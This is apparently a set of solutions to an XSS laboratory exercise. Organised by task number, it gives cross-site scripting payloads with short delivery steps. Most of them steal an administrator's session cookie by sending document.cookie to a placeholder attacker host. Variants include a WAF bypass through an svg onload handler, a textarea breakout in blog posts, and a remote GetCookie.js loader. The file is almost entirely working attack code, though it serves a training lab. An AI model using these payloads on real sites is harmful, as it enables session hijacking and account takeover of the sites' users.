# Second Laboratory (XSS) Scripts

### Get Own Cookies On Search (Task 1.2):

```html
<script>
    document.write(document.cookie);
</script>
```

- Search above Script

---

### Steal Admin's Cookies On Bug / Feature Report (Task 1.4):

```html
<script>
    const HTTP = new XMLHttpRequest();
    const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
    HTTP.open('GET', URL, false);
    HTTP.send();
</script>
```

- Fill <IP> & <PORT> (Attacker Domain)
- Search above Script
- Copy acquired Link
- Report it

---

### Steal Admin's Cookies On Bug / Feature Report Bypassing Simple WAF (Task 2.1):

```html
<svg onload="
    const HTTP = new XMLHttpRequest();
    const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
    HTTP.open('GET', URL, false);
    HTTP.send();
"></svg>
```

- Fill <IP> & <PORT> (Attacker Domain)
- Search above Script
- Copy acquired Link
- Report it

---

### Steal Admin's Cookies On BlogPosts Review (Task 3.2):

```html
</textarea>
    <script>
        const HTTP = new XMLHttpRequest();
        const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
        HTTP.open('GET', URL, false);
        HTTP.send();
    </script>
<textarea>
```

- Fill <IP> & <PORT> (Attacker Domain)
- Post above Script as Blog Content

---

### Steal Admin's Cookies On BlogPosts Review Using Remote Scripts (Task 3.3):

```html
</textarea>
    <script src="http://<IP>:<PORT>/GetCookie.js">
    </script>
<textarea>
```

- Fill <IP> & <PORT> (GetCookie.js Domain)
- Post above Script as Blog Content

#### *GetCookie.js*

```js
const HTTP = new XMLHttpRequest();
const URL = 'http://<IP>:<PORT>/?cookie=' + document.cookie;
HTTP.open('GET', URL, false);
HTTP.send();
```

- Fill <IP> & <PORT> (Attacker Domain)

---
